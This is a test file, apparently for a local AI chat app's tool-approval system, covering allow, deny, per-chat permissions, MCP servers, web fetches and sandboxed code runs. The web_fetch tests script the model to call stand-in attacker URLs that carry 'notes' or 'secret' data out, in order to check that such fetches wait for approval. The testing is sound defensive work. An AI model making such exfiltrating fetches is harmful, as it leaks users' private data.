  const runs: Array<Record<string, unknown>> = []
  let unregister: () => void
  beforeAll(() => {
    unregister = registerToolProvider({
      id: 'notes',
      tools: () => [
        { type: 'function', function: { name: 'notes__delete', description: 'Delete a note', parameters: { type: 'object' } } }
      ],
      pending: ({ name, args }) => ({ tool: name, args, ok: true, pending: true, summary: `note ${String(args.id)}` }),
      run: async ({ name, args }) => {
        runs.push(args)
        return { content: `Deleted note ${String(args.id)}.`, event: { tool: name, args, ok: true, summary: `note ${String(args.id)}` } }
      },
      approval: () => 'ask'
    })
  })
  let unregisterArchive: (() => void) | null = null
  afterAll(() => unregister())
  beforeEach(() => {
    runs.length = 0
  })
  afterEach(() => {
    unregisterArchive?.()
    unregisterArchive = null
  })

  const deleteThenAnswer: ChatHandler = (b, res, n) =>
    n === 1 ? void res.writeHead(200).end(toolCall('notes__delete', { id: 7 })) : reply('Done.')(b, res, n)
  const toolEvents = (conversationId: string) =>
    events.filter((e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === conversationId)
  const waiting = (conversationId: string) => waitFor(() => toolEvents(conversationId).find((e) => e.event.awaiting))
  const toolMessages = (call: Record<string, unknown>) =>
    (call.messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool').map((m) => m.content)

  it('waits for an answer, saving the waiting call at once, and runs it on Allow once', async () => {
    chat = deleteThenAnswer
    const r = start('delete note 7')
    const ask = await waiting(r.conversation.id)
    await new Promise((resolve) => setTimeout(resolve, 50))
    expect(runs).toHaveLength(0)
    expect(chatCalls).toHaveLength(1)
    // Saved straight away (not on the next throttled checkpoint), so a crash keeps the question.
    expect(getMessage(r.assistantMessageId)!.toolEvents[0]).toMatchObject({ tool: 'notes__delete', awaiting: true })
    expect(approvals.waitingCount()).toBe(1)

    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'once')
    const done = await doneEvent(r.conversation.id)
    expect(runs).toEqual([{ id: 7 }])
    expect(toolMessages(chatCalls[1])).toEqual(['Deleted note 7.'])
    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'notes__delete', ok: true })
    expect(done.message.toolEvents[0].awaiting).toBeUndefined()
    expect(approvals.waitingCount()).toBe(0)
    // Once only: the chat didn't start allowing it.
    expect(getConversation(r.conversation.id)!.allowedTools).toEqual([])
  })

  it("tells the model a denied call didn't run, and doesn't ask again in the same reply", async () => {
    // The model tries again after the denial; the second call is declined without asking.
    chat = (b, res, n) =>
      n <= 2 ? void res.writeHead(200).end(toolCall('notes__delete', { id: n })) : reply('I could not delete it.')(b, res, n)
    const r = start('delete note 1')
    const ask = await waiting(r.conversation.id)
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'deny')
    const done = await doneEvent(r.conversation.id)
    expect(runs).toHaveLength(0)
    expect(toolMessages(chatCalls[1])[0]).toMatch(/The user declined to run notes__delete, so it didn't run/)
    expect(toolEvents(r.conversation.id).filter((e) => e.event.awaiting)).toHaveLength(1)
    expect(done.message.toolEvents.map((e) => [e.ok, e.declined])).toEqual([
      [false, true],
      [false, true]
    ])
    const trace = listTraces(r.conversation.id).find((t) => t.kind === 'tool')
    expect(trace?.summary).toBe('notes__delete: declined by you')
  })

  it('remembers Allow for this chat, so later calls in the chat run without asking', async () => {
    chat = deleteThenAnswer
    const r = start('delete note 7')
    const ask = await waiting(r.conversation.id)
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'chat')
    await doneEvent(r.conversation.id)
    expect(getConversation(r.conversation.id)!.allowedTools).toEqual(['notes__delete'])

    events.length = 0
    chatCalls = []
    service.send({
      conversationId: r.conversation.id,
      projectId: null,
      content: 'and again',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    await doneEvent(r.conversation.id)
    expect(runs).toHaveLength(2)
    expect(toolEvents(r.conversation.id).some((e) => e.event.awaiting)).toBe(false)
  })

  it('never runs a call that was waiting when the reply was stopped', async () => {
    chat = deleteThenAnswer
    const r = start('delete note 7')
    const ask = await waiting(r.conversation.id)
    await service.stop(r.conversation.id)
    const saved = getMessage(r.assistantMessageId)!
    expect(runs).toHaveLength(0)
    expect(saved.error).toBeNull()
    expect(saved.toolEvents[0]).toMatchObject({ ok: false, pending: false, summary: 'note 7 (not run)' })
    expect(saved.toolEvents[0].awaiting).toBeUndefined()
    expect(approvals.waitingCount()).toBe(0)
    // Too late to answer now.
    expect(() => approvals.decide(r.conversation.id, ask.messageId, ask.index, 'once')).toThrow(/isn't waiting/)
    expect(listTraces(r.conversation.id).every((t) => t.status !== 'running')).toBe(true)
  })

  it('lets a chat be deleted while a call waits for an answer', async () => {
    chat = deleteThenAnswer
    const r = start('delete note 7')
    await waiting(r.conversation.id)
    await service.stopAll((id) => id === r.conversation.id) // as deleting a chat or project does
    deleteConversation(r.conversation.id)
    expect(service.isReplying()).toBe(false)
    expect(runs).toHaveLength(0)
  })

  it('reads what the chat allows at each call, so a reset mid-reply holds and a later answer does not undo it', async () => {
    // notes__delete was allowed for the chat. The model first calls notes__archive (which asks); while that waits, the
    // user picks "Ask again before each tool". Allowing notes__archive for the chat must not bring notes__delete back,
    // and the model's next notes__delete must ask.
    unregisterArchive = registerToolProvider({
      id: 'archive',
      tools: () => [
        { type: 'function', function: { name: 'notes__archive', description: 'Archive a note', parameters: { type: 'object' } } }
      ],
      pending: ({ name, args }) => ({ tool: name, args, ok: true, pending: true, summary: `note ${String(args.id)}` }),
      run: async ({ name, args }) => ({ content: 'Archived.', event: { tool: name, args, ok: true, summary: 'archived' } })
    })
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('notes__archive', { id: 1 }))
        : n === 2
          ? void res.writeHead(200).end(toolCall('notes__delete', { id: 2 }))
          : reply('Done.')(b, res, n)
    const r = start('tidy up')
    updateConversation(r.conversation.id, { allowedTools: ['notes__delete'] })
    const first = await waiting(r.conversation.id)
    expect(first.event.tool).toBe('notes__archive')
    updateConversation(r.conversation.id, { allowedTools: [] }) // "Ask again before each tool"
    approvals.decide(r.conversation.id, first.messageId, first.index, 'chat')

    const second = await waitFor(() => toolEvents(r.conversation.id).find((e) => e.event.awaiting && e.event.tool === 'notes__delete'))
    expect(runs).toHaveLength(0)
    expect(getConversation(r.conversation.id)!.allowedTools).toEqual(['notes__archive'])
    approvals.decide(r.conversation.id, second.messageId, second.index, 'deny')
    await doneEvent(r.conversation.id)
    expect(runs).toHaveLength(0)
  })

  it('asks for a tool whose provider does not say, and never runs it unasked', async () => {
    unregisterArchive = registerToolProvider({
      id: 'archive',
      tools: () => [
        { type: 'function', function: { name: 'notes__archive', description: 'Archive a note', parameters: { type: 'object' } } }
      ],
      pending: ({ name, args }) => ({ tool: name, args, ok: true, pending: true, summary: 'archive' }),
      run: async () => {
        throw new Error('ran without asking')
      }
    })
    chat = (b, res, n) => (n === 1 ? void res.writeHead(200).end(toolCall('notes__archive', {})) : reply('Done.')(b, res, n))
    const r = start('archive it')
    const ask = await waiting(r.conversation.id)
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'deny')
    const done = await doneEvent(r.conversation.id)
    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'notes__archive', declined: true })
  })

  it('only takes one of the three answers, for the chat the call is in', async () => {
    chat = deleteThenAnswer
    const r = start('delete note 7')
    const ask = await waiting(r.conversation.id)
    expect(() => approvals.decide(r.conversation.id, ask.messageId, ask.index, 'yes' as never)).toThrow(/Unknown answer/)
    expect(() => approvals.decide('another-chat', ask.messageId, ask.index, 'once')).toThrow(/isn't waiting/)
    expect(runs).toHaveLength(0)
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'deny')
    await doneEvent(r.conversation.id)
  })
})

describe('MCP servers in a reply', () => {
  const FIXTURE = new URL('./fixtures/mcp-server.mjs', import.meta.url).pathname
  afterAll(() => mcpManager.stopAll())
  const sendIn = (conversationId: string | null, content: string, toolSources: string[]) =>
    service.send({ conversationId, projectId: null, content, attachmentIds: [], model: 'llama3.2', think: null, skills: [], toolSources })
  const tools = (call: Record<string, unknown>) => ((call.tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)

  it("offers the chat's servers, asks before a call, and gives the model the result", async () => {
    const server = mcpConfig.saveServer({
      name: 'Fixture',
      command: process.execPath,
      args: [FIXTURE],
      cwd: null,
      env: {},
      defaultOn: true
    })
    chat = (b, res, n) => (n === 1 ? void res.writeHead(200).end(toolCall('fixture__echo', { text: 'hi' })) : reply('Done.')(b, res, n))
    const r = sendIn(null, 'echo hi', [`mcp:${server.id}`])
    expect(getConversation(r.conversation.id)!.toolSources).toEqual(['mcp:fixture'])
    const ask = await waitFor(() =>
      events.find(
        (e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === r.conversation.id && !!e.event.awaiting
      )
    )
    expect(ask.event).toMatchObject({ tool: 'fixture__echo', source: 'Fixture', summary: 'hi' })
    expect(tools(chatCalls[0])).toContain('fixture__lookup_codename')
    expect((chatCalls[0].messages as Array<{ content: string }>)[0].content).toMatch(/MCP servers \(Fixture\)/)

    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'once')
    const done = await doneEvent(r.conversation.id)
    const results = (chatCalls[1].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(results.map((m) => m.content)).toEqual(['echo: hi'])
    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'fixture__echo', ok: true, source: 'Fixture' })
    // A chat with tool sources gets more rounds; its debugger trace names the server.
    const trace = listTraces(r.conversation.id).find((t) => t.kind === 'tool')!
    expect(trace.summary).toBe('fixture__echo: hi')

    // Switched off on the next message: no MCP tools, and no MCP section in the prompt.
    events.length = 0
    chatCalls = []
    chat = reply('Plain answer.')
    sendIn(r.conversation.id, 'no tools now', [])
    await doneEvent(r.conversation.id)
    expect(tools(chatCalls[0])).not.toContain('fixture__echo')
    expect((chatCalls[0].messages as Array<{ content: string }>)[0].content).not.toMatch(/mcp_tools/)
  })

  it("says which of the chat's servers couldn't be used", async () => {
    const broken = mcpConfig.saveServer({
      name: 'Broken',
      command: 'ollmost-no-such-server',
      args: [],
      cwd: null,
      env: {},
      defaultOn: false
    })
    chat = reply('Answered without it.')
    const r = sendIn(null, 'hello', [`mcp:${broken.id}`])
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('Answered without it.')
    expect(done.message.stats?.unavailableTools).toEqual([
      expect.stringMatching(/^Broken couldn't start: Couldn't find "ollmost-no-such-server"/)
    ])
    expect(chatCalls[0].tools).toBeUndefined()
  })
})

describe('web_fetch in a chat with files in it', () => {
  const fetchCall = (url: string) =>
    line({
      message: { role: 'assistant', content: '', tool_calls: [{ function: { name: 'web_fetch', arguments: { url } } }] },
      done: false
    }) + line({ done: true })
  const sendWith = (attachmentIds: string[]) =>
    service.send({
      conversationId: null,
      projectId: null,
      content: 'look this up',
      attachmentIds,
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
  const asks = (conversationId: string) =>
    events.filter(
      (e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === conversationId && !!e.event.awaiting
    )
  let fetched: string[]
  beforeEach(() => {
    setApiKey('test-key')
    fetched = []
    web = (path, res) => {
      fetched.push(path)
      res.writeHead(200).end(JSON.stringify({ title: 'Page', content: 'hello', links: [] }))
    }
    chat = (b, res, n) => (n === 1 ? void res.writeHead(200).end(fetchCall('https://evil.example/?d=notes')) : reply('Done.')(b, res, n))
  })

  it('asks before every fetch when the chat has an attachment, fetching nothing before the answer', async () => {
    const file = insertAttachment({
      id: 'att-private',
      kind: 'text',
      name: 'notes.txt',
      mime: 'text/plain',
      size: 12,
      path: join(paths.data, 'files', 'notes.txt'),
      text: 'private notes',
      token_est: 3
    })
    const r = sendWith([file.id])
    const ask = await waitFor(() => asks(r.conversation.id)[0])
    expect(ask.event).toMatchObject({ tool: 'web_fetch', everyTime: true })
    expect(fetched).toHaveLength(0)
    expect(() => approvals.decide(r.conversation.id, ask.messageId, ask.index, 'chat')).toThrow(/only be allowed once or denied/)
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'deny')
    await doneEvent(r.conversation.id)
    expect(fetched).toHaveLength(0)
  })

  it('fetches without asking in a chat with no tools and no files', async () => {
    const r = sendWith([])
    await doneEvent(r.conversation.id)
    expect(asks(r.conversation.id)).toHaveLength(0)
    expect(fetched).toHaveLength(1)
  })
})

describe('web_fetch in a chat with MCP servers', () => {
  const FIXTURE = new URL('./fixtures/mcp-server.mjs', import.meta.url).pathname
  afterAll(() => mcpManager.stopAll())

  it('asks before every fetch, takes only Allow once or Deny, and fetches nothing before the answer', async () => {
    setApiKey('test-key')
    const server = mcpConfig.saveServer({
      name: 'Fetchy',
      command: process.execPath,
      args: [FIXTURE],
      cwd: null,
      env: {},
      defaultOn: false
    })
    const fetched: string[] = []
    web = (path, res) => {
      fetched.push(path)
      res.writeHead(200).end(JSON.stringify({ title: 'Page', content: 'hello', links: [] }))
    }
    const fetchCall = (url: string) =>
      line({
        message: { role: 'assistant', content: '', tool_calls: [{ function: { name: 'web_fetch', arguments: { url } } }] },
        done: false
      }) + line({ done: true })
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(fetchCall('https://evil.example/exec?q=weather'))
        : n === 2
          ? void res.writeHead(200).end(fetchCall('https://evil.example/exec?d=secret'))
          : reply('Done.')(b, res, n)
    const r = service.send({
      conversationId: null,
      projectId: null,
      content: 'check the weather',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: [`mcp:${server.id}`]
    })
    const asks = () =>
      events.filter(
        (e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === r.conversation.id && !!e.event.awaiting
      )
    const first = await waitFor(() => asks()[0])
    expect(first.event).toMatchObject({ tool: 'web_fetch', everyTime: true })
    expect(fetched).toHaveLength(0)
    // "Allow for this chat" isn't an answer this call takes, even if the renderer sent it.
    expect(() => approvals.decide(r.conversation.id, first.messageId, first.index, 'chat')).toThrow(/only be allowed once or denied/)
    approvals.decide(r.conversation.id, first.messageId, first.index, 'once')

    // The next URL on the same site asks again.
    const second = await waitFor(() => asks()[1])
    expect(second.event.summary).toContain('d=secret')
    expect(fetched).toHaveLength(1)
    approvals.decide(r.conversation.id, second.messageId, second.index, 'deny')
    await doneEvent(r.conversation.id)
    expect(fetched).toHaveLength(1)
    expect(getConversation(r.conversation.id)!.allowedTools).toEqual([])
    mcpConfig.removeServer(server.id)
  })
})

// The sandbox is macOS's; CI runs on Linux.
describe.runIf(process.platform === 'darwin')('the code runner in a reply', () => {
  it('prepares the chat’s folder, asks before running, and gives the model what the code printed', async () => {
    const { paths } = await import('../src/main/paths')
    const { mkdtempSync } = await import('node:fs')
    const { tmpdir } = await import('node:os')
    const { join } = await import('node:path')
    const dir = mkdtempSync(join(tmpdir(), 'ollmost-service-runner-'))
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('run_code', { language: 'python', code: 'print(21 * 2)' }))
        : reply('It is 42.')(b, res, n)
    const r = service.send({
      conversationId: null,
      projectId: null,
      content: 'what is 21*2? use code',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: ['code']
    })
    const ask = await waitFor(
      () =>
        events.find(
          (e): e is Extract<ChatEvent, { type: 'tool' }> =>
            e.type === 'tool' && e.conversationId === r.conversation.id && !!e.event.awaiting
        ),
      30_000
    )
    const system = (chatCalls[0].messages as Array<{ content: string }>)[0].content
    expect(system).toMatch(/<code_runner>/)
    expect(system).not.toMatch(/You cannot run code/)
    expect(((chatCalls[0].tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)).toContain('run_code')
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'once')
    const done = await waitFor(
      () => events.find((e): e is Extract<ChatEvent, { type: 'done' }> => e.type === 'done' && e.conversationId === r.conversation.id),
      60_000
    )
    const results = (chatCalls[1].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(results[0].content).toMatch(/^Exit code 0\.\n\n42/)
    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'run_code', ok: true })
  }, 120_000)

  // #88: a code session's reply works in the user's folder with run_command, under the session's prompt.
  it('runs a command in a session’s folder after asking, and remembers Allow for this session', async () => {
    const { paths } = await import('../src/main/paths')
    const { mkdtempSync, realpathSync, writeFileSync, existsSync } = await import('node:fs')
    const { tmpdir } = await import('node:os')
    const { join } = await import('node:path')
    const dir = mkdtempSync(join(tmpdir(), 'ollmost-service-session-'))
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(mkdtempSync(join(tmpdir(), 'ollmost-user-repo-')))
    writeFileSync(join(folder, 'CLAUDE.md'), 'Say hello in French.')
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('run_command', { command: 'echo bonjour > greeting.txt && cat greeting.txt' }))
        : reply('Done: bonjour.')(b, res, n)
    const session = createConversation({
      projectId: null,
      model: 'llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    const r = service.send({
      conversationId: session.id,
      projectId: null,
      content: 'make a greeting file',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    const ask = await waitFor(
      () =>
        events.find(
          (e): e is Extract<ChatEvent, { type: 'tool' }> =>
            e.type === 'tool' && e.conversationId === r.conversation.id && !!e.event.awaiting
        ),
      30_000
    )
    expect(ask.event).toMatchObject({ tool: 'run_command', args: { command: 'echo bonjour > greeting.txt && cat greeting.txt' } })
    const system = (chatCalls[0].messages as Array<{ content: string }>)[0].content
    expect(system).toMatch(/coding agent running inside Ollmost/)
    expect(system).toMatch(new RegExp(`working in the folder ${folder}`))
    expect(system).toMatch(/<project_instructions file="CLAUDE\.md">[\s\S]*Say hello in French/)
    expect(system).not.toMatch(/<artifacts>|<code_runner>/)
    const offered = ((chatCalls[0].tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)
    expect(offered).toContain('run_command')
    expect(offered).not.toContain('run_code')
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'chat')
    const done = await waitFor(
      () => events.find((e): e is Extract<ChatEvent, { type: 'done' }> => e.type === 'done' && e.conversationId === r.conversation.id),
      60_000
    )
    const results = (chatCalls[1].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(results[0].content).toMatch(/^Exit code 0\.\n\nbonjour/)
    expect(done.message.toolEvents[0]).toMatchObject({
      tool: 'run_command',
      ok: true,
      summary: 'echo bonjour > greeting.txt && cat greeting.txt'
    })
    expect(existsSync(join(folder, 'greeting.txt'))).toBe(true)
    expect(getConversation(session.id)!.allowedTools).toEqual(['code:commands'])
    expect(existsSync(join(dir, 'runner', 'sessions', session.id, 'home'))).toBe(true)
    // The session's title stays: only a 'New chat' gets titled (an earlier test's title request may still arrive here).
    await new Promise((resolve) => setTimeout(resolve, 300))
    expect(titleCalls.some((t) => JSON.stringify(t).includes('make a greeting file'))).toBe(false)
    expect(getConversation(session.id)!.title).toBe('repo')
  }, 120_000)

  // #93: a session's file tools in one turn: a read that runs unasked, an edit that asks and shows its diff, then a
  // command that asks under its own key.
  it('reads, edits after asking with a diff, and runs a command, in one turn', async () => {
    const { paths } = await import('../src/main/paths')
    const { mkdtempSync, realpathSync, writeFileSync, readFileSync } = await import('node:fs')
    const { tmpdir } = await import('node:os')
    const { join } = await import('node:path')
    const dir = mkdtempSync(join(tmpdir(), 'ollmost-service-files-'))
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(mkdtempSync(join(tmpdir(), 'ollmost-user-repo-')))
    writeFileSync(join(folder, 'hello.py'), 'print("hello")\n')
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('read_file', { path: 'hello.py' }))
        : n === 2
          ? void res.writeHead(200).end(toolCall('edit_file', { path: 'hello.py', old_string: 'hello', new_string: 'bonjour' }))
          : n === 3
            ? void res.writeHead(200).end(toolCall('run_command', { command: 'cat hello.py' }))
            : reply('Changed the greeting.')(b, res, n)
    const session = createConversation({
      projectId: null,
      model: 'llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    const r = service.send({
      conversationId: session.id,
      projectId: null,
      content: 'say bonjour instead',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    const asks = (index: number) =>
      waitFor(
        () =>
          events.find(
            (e): e is Extract<ChatEvent, { type: 'tool' }> =>
              e.type === 'tool' && e.conversationId === r.conversation.id && e.index === index && !!e.event.awaiting
          ),
        30_000
      )
    const edit = await asks(1)
    expect(edit.event).toMatchObject({
      tool: 'edit_file',
      args: { path: 'hello.py', old_string: 'hello', new_string: 'bonjour' },
      diff: '--- a/hello.py\n+++ b/hello.py\n@@ -1,1 +1,1 @@\n-print("hello")\n+print("bonjour")'
    })
    // The read ran unasked, and the model got the numbered file.
    const offered = ((chatCalls[0].tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)
    expect(offered).toEqual(['read_file', 'list_files', 'search_files', 'edit_file', 'write_file', 'run_command'])
    const results = (i: number) => (chatCalls[i].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(results(1)[0].content).toBe('hello.py (1 line)\n\n     1\tprint("hello")')
    approvals.decide(r.conversation.id, edit.messageId, edit.index, 'chat')
    const command = await asks(2)
    expect(command.event).toMatchObject({ tool: 'run_command', args: { command: 'cat hello.py' } })
    expect(results(2)[1].content).toMatch(/^Edited hello\.py \(\+1 −1\)\.\n\n--- a\/hello\.py/)
    approvals.decide(r.conversation.id, command.messageId, command.index, 'once')
    const done = await waitFor(
      () => events.find((e): e is Extract<ChatEvent, { type: 'done' }> => e.type === 'done' && e.conversationId === r.conversation.id),
      60_000
    )
    expect(results(3)[2].content).toMatch(/^Exit code 0\.\n\nprint\("bonjour"\)/)
    expect(done.message.toolEvents.map((e) => [e.tool, e.ok, e.summary])).toEqual([
      ['read_file', true, '1 line'],
      ['edit_file', true, '+1 −1'],
      ['run_command', true, 'cat hello.py']
    ])
    expect(done.message.toolEvents[1]).toMatchObject({ files: [{ path: 'hello.py', size: 17 }] })
    expect(done.message.toolEvents[1].diff).toMatch(/^--- a\/hello\.py/)
    expect(readFileSync(join(folder, 'hello.py'), 'utf8')).toBe('print("bonjour")\n')
    // Allow for this session covered the edit; the command was allowed once.
    expect(getConversation(session.id)!.allowedTools).toEqual(['code:edits'])
  }, 120_000)

  it('doesn’t ask about an edit that can’t be made: the model gets the failure', async () => {
    const { paths } = await import('../src/main/paths')
    const { mkdtempSync, realpathSync, writeFileSync, readFileSync } = await import('node:fs')
    const { tmpdir } = await import('node:os')
    const { join } = await import('node:path')
    const dir = mkdtempSync(join(tmpdir(), 'ollmost-service-refused-'))
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(mkdtempSync(join(tmpdir(), 'ollmost-user-repo-')))
    writeFileSync(join(folder, 'hello.py'), 'print("hello")\n')
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('edit_file', { path: 'hello.py', old_string: 'goodbye', new_string: 'bonjour' }))
        : reply('Nothing to change.')(b, res, n)
    const session = createConversation({
      projectId: null,
      model: 'llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    const r = service.send({
      conversationId: session.id,
      projectId: null,
      content: 'say bonjour instead of goodbye',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    const done = await waitFor(
      () => events.find((e): e is Extract<ChatEvent, { type: 'done' }> => e.type === 'done' && e.conversationId === r.conversation.id),
      60_000
    )
    expect(events.filter((e) => e.type === 'tool' && e.conversationId === r.conversation.id && e.event.awaiting)).toEqual([])
    expect(done.message.toolEvents.map((e) => [e.tool, e.ok, e.summary])).toEqual([['edit_file', false, 'old_string not found']])
    const results = (chatCalls[1].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(results[0].content).toMatch(/^Error: old_string was not found in hello\.py/)
    expect(readFileSync(join(folder, 'hello.py'), 'utf8')).toBe('print("hello")\n')
    expect(getConversation(session.id)!.allowedTools).toEqual([])
  }, 60_000)

  it('says when a session’s folder is gone, and offers no code tools that turn', async () => {
    const { mkdtempSync, realpathSync, rmSync } = await import('node:fs')
    const { tmpdir } = await import('node:os')
    const { join } = await import('node:path')
    const folder = realpathSync(mkdtempSync(join(tmpdir(), 'ollmost-user-gone-')))
    const session = createConversation({
      projectId: null,
      model: 'llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'gone'
    })
    rmSync(folder, { recursive: true })
    chat = reply('I cannot see the folder.')
    const r = service.send({
      conversationId: session.id,
      projectId: null,
      content: 'hi',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    const done = await doneEvent(r.conversation.id)
    expect(done.message.stats?.unavailableTools?.[0]).toMatch(
      /This session's tools aren't available: This session's folder is no longer at/
    )
    expect(chatCalls[0].tools).toBeUndefined()
    expect((chatCalls[0].messages as Array<{ content: string }>)[0].content).toMatch(/coding agent/)
  })
})

describe('markInterruptedReplies', () => {
  it('flags replies that never got their final save, and only those', () => {
    const c = createConversation({ projectId: null, model: 'llama3.2', think: null, skills: [], toolSources: [] })
    const user = insertMessage({ conversationId: c.id, parentId: null, role: 'user', content: 'hi' })
    const cut = insertMessage({ conversationId: c.id, parentId: user.id, role: 'assistant', content: '' })
    // A checkpoint wrote text and a running tool, then the app died.
    updateMessage(cut.id, {
      content: 'so far',
      toolEvents: [
        { tool: 'web_search', args: {}, ok: true, pending: true, summary: 'ollmost' },
        { tool: 'notes__delete', args: {}, ok: true, pending: true, awaiting: true, summary: 'note 7' }
      ]
    })
    const finished = insertMessage({ conversationId: c.id, parentId: user.id, role: 'assistant', content: 'done' })
    updateMessage(finished.id, { stats: { promptTokens: 1, completionTokens: 1 } })

    expect(service.markInterruptedReplies()).toBeGreaterThanOrEqual(1)
    const after = getMessage(cut.id)!
    expect(after.content).toBe('so far')
    expect(after.error).toMatch(/closed before this reply finished/)
    expect(after.toolEvents[0]).toMatchObject({ pending: false, ok: false })
    // A call still waiting for an answer never ran.
    expect(after.toolEvents[1]).toEqual({ tool: 'notes__delete', args: {}, ok: false, pending: false, summary: 'note 7 (not run)' })
    // Checkpoints skip search indexing; marking the reply indexes the text it kept.
    expect(search('so far').map((h) => h.conversationId)).toContain(c.id)
    expect(getMessage(finished.id)!.error).toBeNull()
  })
})
